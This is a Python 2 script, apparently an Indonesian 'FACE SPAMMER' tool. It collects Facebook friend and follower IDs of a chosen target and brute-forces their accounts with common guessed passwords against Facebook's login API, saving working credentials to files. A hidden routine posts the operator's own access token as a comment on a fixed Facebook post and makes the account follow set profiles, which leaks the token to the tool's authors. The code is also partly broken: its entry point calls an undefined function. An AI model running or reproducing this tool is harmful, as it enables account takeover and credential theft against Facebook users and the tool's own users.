# -*- coding: utf-8
#BY : FACE SPAMMER
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
P  = '\033[1;97m'  # biru
M  = '\033[1;91m' # biru
H  = '\033[1;92m' # biru
K = '\033[1;93m' # biru
B  = '\033[1;94m' # biru
U  = '\033[1;95m' # biru
O = '\033[1;96m' # kuning

my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import uuid
import ipaddress
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from time import sleep
from datetime import datetime
try:
	import requests
except ImportError:
	print '[×] Modul requests belum terinstall!...\n'
	os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def logo():
	print("""     
FACE SPAMMER TOOS  PREMIUM- KHUSUS UNTUK MEMBER FACESPAMMER""""")
id = []
cp = []
ok = []
loop = 0
s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text

ct = datetime.now()
n = ct.month
bulan1 = [    'Januari',   'Februari',    'Maret',    'April',    'Mei',    'Juni',    'Juli',    'Agustus',    'September',    'Oktober',    'Nopember',    'Desember']
   
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
    
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"
}
hari = datetime.now().strftime('%A')

useragents = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 Instagram 138.0.0.28.117 Android (29/10; 440dpi; 1080x2210; Xiaomi; Mi 9T Pro; raphael; qcom; fr_FR; 210180522)'

def masuk():
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		logo()
		print("\033[0;95m FACE SPAMMER TOOLS '\033[0;94PREMIUM\033[0;95m' GASSSSSS")
		token = raw_input(" MASUKE TOKENE : ")
		if token == "FACE SPAMMER":
			os.system("xdg-open https://free.facebook.com/")
			exit(" AWASS BUKAN ANGGOTA FACE SPAMMER DI LARANG BUKA")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open("login.txt", 'w')
			zedd.write(token)
			zedd.close()
			print (" √ LOGINE BERHASILL BROO... ")
			hamz_bot()
		except KeyError:
			print (" × token invalid") 
			sys.exit()
    
def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print (' • kesalahan tidak bisa crack')
		os.system("rm -f login.txt")
		masuk()
	except requests.exceptions.ConnectionError:
		print (' × SINYALE ILANG JAJAL DELOK SINYALE')
		sys.exit()
	logo()
	print" \033[0;95m  NAMA       : "+nama
	print" \033[0;95m  IP ADDRESS : "+ip
	print" \033[0;94m  #----FACE--SPAMMER---TOOLS-#"
	print" \033[0;93m  1. GOLEK AKUN PUBLIK"
	print" \033[0;91m  2. GOLEK AKUN SEKO FOLLOWER"
	print" \033[0;92m  3. LIHAT HASIL NAMBANG AKUN"
	print" \033[0;93m  0. HAPUS TOKEN"
	print
	hamz_ganteng()
	
def hamz_ganteng():
	ask = raw_input("\033[1;95m  ︻デ═一▸ \033[92m :\033[1;92m ")
	if ask == "":
		print
		print (" \033[0;97× YANG BENAR DONGSSSS") 
		exit()
	elif ask in["1","01"]:
		print ("\033[0;92mKETIK \033[093m 'me' \033[0;092mAMBIL DARI ID TEMAN SENDIRI") 
		idt = raw_input(" ID TARGET SAMPEAN MINIMAL 4000 KAWANE : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
		except KeyError:
			print (" × AKUNE NDAK PUBLIK ID NE") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask in["2","02"]:
		print ("\n × ketik 'me' untuk crack daftar followers sendiri") 
		idt = raw_input(" ? id publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
		except KeyError:
			print (" × maaf id tidak publik") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask in["3","03"]:
		print"   1. lihat hasil ok"
		print"   2. lihat hasil cp"
		ress = raw_input("* pilih : ")
		if ress =="":
			menu()
		elif ress == "1" or ress == "01":
			print ("\n [+] hasil \033[0;92mok\033[0;97m tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("cat out/OK-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		elif ress == "2" or ress == "02":
			print (" [+] hasil \033[0;93mcp\033[0;97m tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		else:
			exit(" × pilih yang benar sayang") 
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print (" √ berhasil menghapus token") 
		exit()
	else:
		print (" × pilih yang benar sayang") 
		exit()
	
	print" \033[0;97m× total id  : " +str(len(id))
	ask = raw_input("\033[0;93m <> \033[0;95m MAU GUNAKAN PASSWORD MANUAL? (y/t) : ")
	if ask == "Y" or ask == "y":
		manual()
	print
	print" × MISALE ORAH ONO HASIL MODE PESAWAT DILUK AE "
	print

	def main(arg):
		global ok,cp,ua, loop
		print '\r >< %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'katasandi', 'sayang', 'bismillah', 'doraemon', 'sayangku', 'indonesia', 'rahasia', 'anjing']:
				ua =random.choice(["Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC6-00/40.0.021; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.25 3gpp-gba",
                "Mozilla/5.0 (Series40; NokiaC2-02/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31",
                "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]",
                "Mozilla/5.0 (Linux; U; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/52.2.2254.54723",
                "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
                "Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/327.0.0.33.120;]",
                "Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 9 Pro Max Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-g",
                "Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36"])
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[0;94m *  \033[0;92mok\033[0;94m\033[0;94m ' +uid+ ' • ' + pw+ '        '
					ok.append(uid+' • '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [OK] '+str(uid)+' • '+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					print'\r \033[0;94m >,< ' +uid+ ' | ' + pw+ '        '
					cp.append(uid+' | '+pw)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write(' \033[0;94m >,< ' +str(uid)+' | '+str(pw)+'\n')
					save.close()
					break
					continue
					continue

			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print(" \WES RAMPUNG GOLEK AKUN NE ")
	exit()

def manual():
	print("\033[0;97m <> masukan password contoh : bangladesh,102030,786786")
	pw = raw_input("\033[0;97m <>  sett password : ").split(",")
	print
	if len(pw) ==0:
		exit(" *  isi yang bener, tidak boleh kosong")
	print("\033[0;97m <>  jumlah password yang di buat : \033[0;93m" +str(len(pw)))
	
	def main(arg):
		global ok,cp,ua,loop
		print '\r \033[0;95m  %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for asu in pw:
				ua =random.choice(["Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111"])
				anak_setan = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=anak_setan)
				if "access_token" in send.text and "EAAA" in send.text:
					print'\r \033[0;92m* --> ' +uid+ ' | ' + asu + '        '
					ok.append(uid+' | '+asu)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write(' \033[0;92m >,< ' +str(uid)+' | '+str(asu)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					print'\r \033[0;92m >,< ' +uid+ ' | ' + asu+ '        '
					cp.append(uid+' | '+asu)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write(' \033[0;92m >,< ' +str(uid)+' | '+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\n *  WES RAMPUNG GOLEK AKUN NE SALIN YO")
	exit()
	
def hamz_bot():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print (' [!] Token invalid') 
        os.system('rm -rf login.txt')
    kom = " ANAK FACE SPAMMER TOOLS"
    requests.post('https://graph.facebook.com/100008065235213/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100004715860665/subscribers?access_token=' + token)

    requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +token+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +kom+ '&access_token=' + token)
    menu()
    
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0012)
        
if __name__ == '__main__':
	MASUK()